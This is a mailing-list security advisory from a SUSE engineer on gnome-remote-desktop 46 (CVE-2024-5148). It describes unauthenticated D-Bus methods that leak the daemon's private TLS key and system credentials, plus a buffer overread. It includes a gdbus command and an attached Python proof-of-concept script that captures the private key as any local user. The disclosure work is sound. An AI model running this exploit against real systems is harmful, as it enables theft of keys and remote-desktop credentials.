Received: (qmail 14112 invoked by uid 550); 24 May 2024 09:40:10 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 14082 invoked from network); 24 May 2024 09:40:10 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1716543601; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=P7hRhmYGaF6wCw6oucJD6O2CgLawBzokomb8rvZ8xys=;
	b=P0Gu5DIHdBb7kV1xA15TzodLOi4vONMs34IzdQIZ4YDRN429F29zSI0CSyKutoKMbr9aAz
	sdu2MkTgC29pVUz/4wSr4z4WKq+7OQsTxjHls+ff6TNlvOEs6ebsZtHQ+vogRRbzgAIqpt
	UpVPjaMlHF+aKSEOcDvE9r2HmH9oEio=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1716543601;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=P7hRhmYGaF6wCw6oucJD6O2CgLawBzokomb8rvZ8xys=;
	b=0Oi4Jeso7MWd+KECfs+QKsQEtZliJmz0UrFkv0U/naYOEZexVo03SS2NXiZ+c7OsfbXgLm
	T5nDXBqk6rJz8ABQ==
Authentication-Results: smtp-out1.suse.de;
	dkim=pass header.d=suse.de header.s=susede2_rsa header.b=P0Gu5DIH;
	dkim=pass header.d=suse.de header.s=susede2_ed25519 header.b=0Oi4Jeso
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1716543601; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=P7hRhmYGaF6wCw6oucJD6O2CgLawBzokomb8rvZ8xys=;
	b=P0Gu5DIHdBb7kV1xA15TzodLOi4vONMs34IzdQIZ4YDRN429F29zSI0CSyKutoKMbr9aAz
	sdu2MkTgC29pVUz/4wSr4z4WKq+7OQsTxjHls+ff6TNlvOEs6ebsZtHQ+vogRRbzgAIqpt
	UpVPjaMlHF+aKSEOcDvE9r2HmH9oEio=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1716543601;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=P7hRhmYGaF6wCw6oucJD6O2CgLawBzokomb8rvZ8xys=;
	b=0Oi4Jeso7MWd+KECfs+QKsQEtZliJmz0UrFkv0U/naYOEZexVo03SS2NXiZ+c7OsfbXgLm
	T5nDXBqk6rJz8ABQ==
Date: Fri, 24 May 2024 11:39:57 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <ZlBgbzRvIzgZwJsd@kasco.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="3iB84huFp5EtIx/7"
Content-Disposition: inline
Subject: [oss-security] gnome-remote-desktop: D-Bus system service in GNOME release 46 local
 information leaks (CVE-2024-5148)

--3iB84huFp5EtIx/7
Content-Type: multipart/mixed; protected-headers=v1;
	boundary="6tXS8sGpgBrgEPCk"
Content-Disposition: inline
Date: Fri, 24 May 2024 11:39:57 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Subject: gnome-remote-desktop: D-Bus system service in GNOME release 46 local
 information leaks (CVE-2024-5148)


--6tXS8sGpgBrgEPCk
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello list,

gnome-remote-desktop [1] offers access to the graphics system either via
the VNC or the RDP (Microsoft remote desktop) network protocol. Before
version 46, gnome-remote-desktop was only used in the context of
existing graphical user sessions. Starting with version 46, one can also
configure a system daemon, that allows to connect to the GNOME display
manager (GDM), allowing to create graphical sessions remotely.

The system daemon runs as a dedicated "gnome-remote-desktop" user. It
provides a D-Bus interface on the D-Bus system bus. The daemon also
interacts with a newly introduced D-Bus interface provided by GDM, to
create remote displays.

While reviewing the new system service I found a number of local
security issues and areas for security improvement. The more relevant
issues are discussed in this report, while an upstream Gitlab issue [2]
contains a more detailed report and discussions also covering less
severe aspects found during the review.

This report relates to gnome-remote-desktop release 46.0. Bugfixes for
the issues described are found in release 46.2, except for item C) for
which no fix is available yet.

We also offer a rendered HTML version of this report on our blog [3].

Review Motivation and Scope
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D

D-Bus system services require a review by the SUSE security team, before
they can be added to openSUSE distributions and derived products. With
the addition of the system daemon, a review of gnome-remote-desktop became
necessary, before adding it to openSUSE Tumbleweed in the context of the
larger GNOME 46 release.

The review was mainly concerned with the newly introduced system level
gnome-remote-desktop daemon. The focus was furthermore on code paths related
to the RDP protocol, which is the default and preferred over the VNC
protocol.

Since the codebase of gnome-remote-desktop is rather large, I focused the
review on the security of the D-Bus methods, the Polkit authentication and
parts of the network processing. I did not look closely into the FreeRDP
library, which is used by gnome-remote-desktop for processing the majority =
of
the RDP protocol.

A) Unauthenticated Handover D-Bus Interface (CVE-2024-5148)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D

Only the "org.gnome.RemoteDesktop.Rdp.Server" D-Bus interface is
protected by Polkit. `auth_admin` authorization is required on this
interface for all methods. The other two interfaces "Dispatcher" and
"Handover" are not authorized and are accessible to all local users in
the system. This leads to a number of local security issues described in
the following subsections.

Local Private Key Leak
----------------------

The system daemon keeps public SSL certificates and their corresponding
private keys in "/var/lib/gnome-remote-desktop/.local/share/gnome-remote-de=
sktop/certificates".
Access to the service's home directory in "/var/lib/gnome-remote-desktop"
is restricted to the service user "gnome-remote-desktop", mode 0700.

Through the "org.gnome.RemoteDesktop.Rdp.Handover" D-Bus interface any
local user can intercept the private SSL key, though. The private key is
returned from the `StartHandover` D-Bus function. When a remote desktop
client connects to the system daemon, then there is a rather long time
window, during which any local user (even `nobody`) can call this method on
the created session object. This is an example call to achieve this:

    gdbus call -y -d org.gnome.RemoteDesktop -o /org/gnome/RemoteDesktop/Rd=
p/Handovers/sessionc11 \
        -m org.gnome.RemoteDesktop.Rdp.Handover.StartHandover someuser some=
pass

The username and password parameters are not important here, they will
only be forwarded to the connecting client. Doing this, as another
effect, also results in a denial-of-service, because the proper connection
handover will be prevented.

A local attacker does not necessarily have to wait for somebody to
connect to the system daemon, it can connect on its own via localhost,
to achieve the same result. Valid credentials for RDP authentication are
necessary to get to the handover stage, however.

The impact of this problem is a local information leak and local DoS.
The information leak means that the integrity and privacy of RDP
connections on the system are compromised. Attached to this mail is a
simple Python script, which allows to reproduce the issue.

System Credentials Leak
-----------------------

If an RDP connection uses shared system credentials (see struct member
`GrdRemoteClient.use_system_credentials`), then a local attacker with
low privileges can obtain these credentials in cleartext in a similar
fashion to the private key leak, by calling the unauthenticated
`GetSystemCredentials()` D-Bus method of the Handover interface.

Using these system credentials, the attacker will be able to connect to
the display manager via RDP. This should not directly grant access to a
session, since a login on display manager level still has to happen. An
exception would be if things like automatic login are enabled (I
don't know whether they apply to remote connections).

The Socket Connection can be Obtained via TakeClient()
------------------------------------------------------

The equally unauthenticated D-Bus method `Handover.TakeClient()` allows
any local user in the system to obtain the file descriptor pertaining to
the RDP client that is in handover state. This could allow a local user
to perform a denial-of-service of the RDP connection or to setup a
crafted RDP session.

Obtaining the socket via this call only works in certain system daemon
states, most notably it seems the `StartHandover()` needs to have been
performed for this to succeed. I did not fully investigate what the
exact preconditions are.

Bugfix and Affectedness
-----------------------

This CVE only affects gnome-remote-desktop releases 46.0 and 46.1, since the
system daemon was only introduced in these versions. The bugfix is available
starting from version 46.2 and is found in commit 9fbaae1a [4].

With the bugfix applied, only the user for whom a new session has been
created will be able to call the handover interface anymore. This still mea=
ns
that all users with RDP access share the same private key, which, according=
 to
upstream, is by protocol design.

B) `find_cr_lf()` Suffers from a one Byte Overread
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

This function processes untrusted pre-authentication RDP protocol
network data (the routing token) and looks for a terminating `\r\n`
sequence. The size calculation in the function's for loop is wrong: if
the final byte of the buffer is 0x0D, then the logic will access the
next byte out of bounds. This buffer is not null terminated.

The impact should be negligible in most cases. This is the output of Valgri=
nd
I obtained after sending a crafted packet to the daemon:

    =3D=3D31119=3D=3D Invalid read of size 1
    =3D=3D31119=3D=3D    at 0x15A1EF: UnknownInlinedFun (grd-rdp-routing-to=
ken.c:65)
    =3D=3D31119=3D=3D    by 0x15A1EF: UnknownInlinedFun (grd-rdp-routing-to=
ken.c:159)
    =3D=3D31119=3D=3D    by 0x15A1EF: UnknownInlinedFun (grd-rdp-routing-to=
ken.c:239)
    =3D=3D31119=3D=3D    by 0x15A1EF: peek_routing_token_in_thread (grd-rdp=
-routing-token.c:281)
    <snip>

Bugfix
------

The bugfix is found starting in release 46.2 in commit 663ad63172 [5].

C) `grdctl` Utility Accepts Cleartext Password on the Command Line
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The text-based `grdctl` configuration utility, which is used for both,
system and session context RDP setups, accepts cleartext passwords in
the following invocation styles:

```
grdctl [--system] rdp set-credentials <username> <password>
grdctl [--system] vnc set-password <username> <password>
```

This means that the cleartext password will leak via the /proc file
system and will be visible in the process task list via `ps`, when
configured this way. Other users can thus get access to the
authentication data.

Bugfix
------

Upstream declined assignment of a CVE for this issue. They consider the
shared credentials to be of rather low sensitivity and state that other
ways exist for users to set the credentials, that don't leak information
to other users (GNOME Control Center, the D-Bus API, writing the
credentials file directly). A feature request to allow reading the
password via stdin has been added to an existing Gitlab
issue [6].

Timeline
=3D=3D=3D=3D=3D=3D=3D=3D

2024-04-19: I reported the issues and other recommendations and remarks
    via a private issue [2] in the upstream Gitlab, offering
    coordinated disclosure.
2024-04-22: Upstream decided to handle all findings except for the
    unauthenticated Handover D-Bus methods publicly. No formal coordinated
    release date was established for the remaining private issue.
2024-04-26: I requested a CVE from Mitre to track the unauthenticated
    Handover D-Bus methods issue described in section A).
2024-05-13: After Mitre did not assign a CVE for weeks, it was agreed
    upon that upstream would request a CVE from RedHat instead.
2024-05-20: Upstream received CVE-2024-5148 to track the unauthenticated
    Handover D-Bus methods issue.
2024-05-21: After asking for the expected time frame for publication of
    the remaining private issue, upstream decided to publish right away.

References
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

[1]: https://gitlab.gnome.org/GNOME/gnome-remote-desktop
[2]: https://gitlab.gnome.org/GNOME/gnome-remote-desktop/-/issues/196
[3]: https://security.opensuse.org/2024/05/22/gnome-remote-desktop-system-d=
bus.html
[4]: https://gitlab.gnome.org/GNOME/gnome-remote-desktop/-/commit/9fbaae1aa=
a0b821e4a859f22bad17979225af058=20
[5]: https://gitlab.gnome.org/GNOME/gnome-remote-desktop/-/commit/663ad6317=
2e0bfc8bd50a475ede753583bc3c99a
[6]: https://gitlab.gnome.org/GNOME/gnome-remote-desktop/-/issues/180

Best Regards

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Security Engineer
https://www.suse.com/security
GPG Key ID: 0x14C405C971923553
=20
SUSE Software Solutions Germany GmbH
HRB 36809, AG N=FCrnberg
Gesch=E4ftsf=FChrer: Ivo Totev, Andrew McDonald, Werner Knoblich

--6tXS8sGpgBrgEPCk
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="wait_for_grd_priv_key.py"

#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner@suse.com>
# Date: 2024-04-19

# This script is a simple demonstration of how any local user with access to
# the D-Bus system bus can obtain the private key of the gnome-remote-desktop
# system daemon.
#
# For this the script monitors the creation of new Handovers sessions on the
# g-r-d D-Bus service, and then invokes the StartHandover method with
# arbitrary parameters to obtain the public certificate and private key.
#
# You can run it e.g. as the `nobody` user:
#
#     root# sudo -u nobody -g nobody /bin/bash
#     nobody$ /path/to/wait_for_grd_priv_key.py
#
# On success the private server key will be printed to stdout.


import subprocess

monitor = subprocess.Popen("gdbus monitor -y -d org.gnome.RemoteDesktop -o /org/gnome/RemoteDesktop/Rdp/Handovers".split(), stdout=subprocess.PIPE)

while True:
    line = monitor.stdout.readline()
    if line is None:
        print("monitor EOF encountered?")
        sys.exit(1)
    line = line.decode()
    # we are looking for a new object Handovers/sessionc<integer>
    idx = line.find("sessionc")
    if idx == -1:
        continue

    line = line[idx:]
    # extract the string up to the quote, this makes up the sessionc<integer>
    # object name we need
    idx = line.find("'")
    if idx == -1:
        continue
    line = line[:idx]
    session = line
    print("found session", session)
    break

monitor.terminate()
monitor.wait()

# now invoke the StartHandover method on the newly available session
out = subprocess.check_output(f"gdbus call -y -d org.gnome.RemoteDesktop -o /org/gnome/RemoteDesktop/Rdp/Handovers/{session} -m org.gnome.RemoteDesktop.Rdp.Handover.StartHandover someuser somepass".split())
out = out.decode()

idx = out.find("-----BEGIN PRIVATE KEY-----")

if idx == -1:
    print("unexpected StartHandover result:", out.decode())
    sys.exit(1)

cert = out[idx:].strip().strip("()'")
print(cert.replace('\\n', '\n'))

--6tXS8sGpgBrgEPCk--

--3iB84huFp5EtIx/7
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmZQYG4ACgkQFMQFyXGS
NVN1WBAAimQjwbxpb+hRpq5vXFjS5SNnZqkCM+zifAVVjuvHXM0oDOhreEsKibUA
WEeKZLdJRTdTaCSrWLR+WANy2BuJ/EdKIKDrlr043X/Md5z5CosyidZZvbXohGDQ
zsuUxxrFIYkpRlfEyJk/r9H5/eiABWD4HZ+dx1aWeDPpXdD2L1fIXtS0kNmY4b37
GnXtasjl2hGkFcCfE2/54rg+qUjRKyuhSHCppqC4w4Q9Nh5SdeQpCFxd6uLeoYFO
KSSq6shItZusXHw3SjUkDbQBuh730LXfH2/3ZZvAN7vvB5Uvn0A2P+nVAyolYfcS
ctZflYdvv+R+zG3abnxxeF6YSQvu0G6K9jh9J51mdrejDoeWRfjmwUoIf8kIW7QZ
YIjh2q23yQ57pCpicMzfriIH6MxFIveD5KcF00fZkdLcjq/tOcAsuvsM3nqtkp43
HRGX3UihaQj1ySGBeSxOQZj7bUrxR6LNwH4NDXr+SLRI0U/dkkIJWiNxy2LLkZNl
c7g/8V8TTNq+CrR4U/YAJgudhBtNiPR5z5EHRiyz6/W7A9cw/pGn6Jx+yXRrCd7n
/DxRfrVo57gEngGxIwZ8BPSLOR5DrgxDLNPhrujmuCktQzAFaiQunw/Q5lbHxmCs
d34QRQPo2T6iyeUJfQFpqcgq+uEuit/oBGFQsRsuyHfKkUVv++w=
=4GwJ
-----END PGP SIGNATURE-----

--3iB84huFp5EtIx/7--
